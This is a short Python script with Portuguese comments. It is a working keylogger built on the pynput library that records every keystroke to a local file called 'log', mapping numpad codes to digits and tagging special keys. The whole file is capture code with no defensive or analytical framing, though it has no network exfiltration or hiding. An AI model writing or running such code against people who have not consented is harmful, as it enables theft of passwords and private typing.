
# importando a função LISTENER da lib pynput para ler as entradas do KEYBOARD
from pynput.keyboard import Listener
    
# lista de teclas especiais
special_keys = ['Key.esc', 'Key.tab', 'Key.caps_lock', 'Key.shift', 'Key.ctrl_l',
                'Key.cmd', 'Key.alt_l', 'Key.ctrl_l', 'Key.alt_r', 'Key.shift_r', 
                'Key.enter', 'Key.backspace', 'Key.delete', 'Key.home', 'Key.page_up', 
                'Key.page_down', 'Key.end', 'Key.f1', 'Key.f2', 
                'Key.f3', 'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7', 
                'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', 
                'Key.print_screen', 'Key.pause', 'Key.space', 'Key.left', 'Key.right',
                'Key.up', 'Key.down']


# função para imprimir as teclas digitadas
def get_key(key):

    # criando o arquivo logs.txt 
    logs = open('log', 'a')
    key = str(key)

    # nesse if, as teclas especiais são formatadas entre <>
    if(key in special_keys):
        logs.write(f'<{key}>\n')

    # classifica as entradas na num board, "traduz" a tabela ascii     
    elif (key == '<96>'):
        logs.write("'0'\n")
    
    elif (key == '<97>'):
        logs.write("'1'\n")
    
    elif (key == '<98>'):
        logs.write("'2'\n")
    
    elif (key == '<99>'):
        logs.write("'3'\n")
    
    elif (key == '<100>'):
        logs.write("'4'\n")
    
    elif (key == '<101>'):
        logs.write("'5'\n")
    
    elif (key == '<102>'):
        logs.write("'6'\n")
    
    elif (key == '<103>'):
        logs.write("'7'\n")
    
    elif (key == '<104>'):
        logs.write("'8'\n")
    
    elif (key == '<105>'):
        logs.write("'9'\n")
    
    elif (key == '<110>'):
        logs.write("','\n") 
        
    # caso o botão power seja acionado
    elif (key == '<255>'):
        print("'Power'\n")
        
    # mostra a tecla digitada caso não seja uma tecla especial ou num board
    else:
        logs.write(f'{key}\n')


# executa o programa e obtém as teclas
with Listener(on_press = get_key) as listen:
    listen.join() 

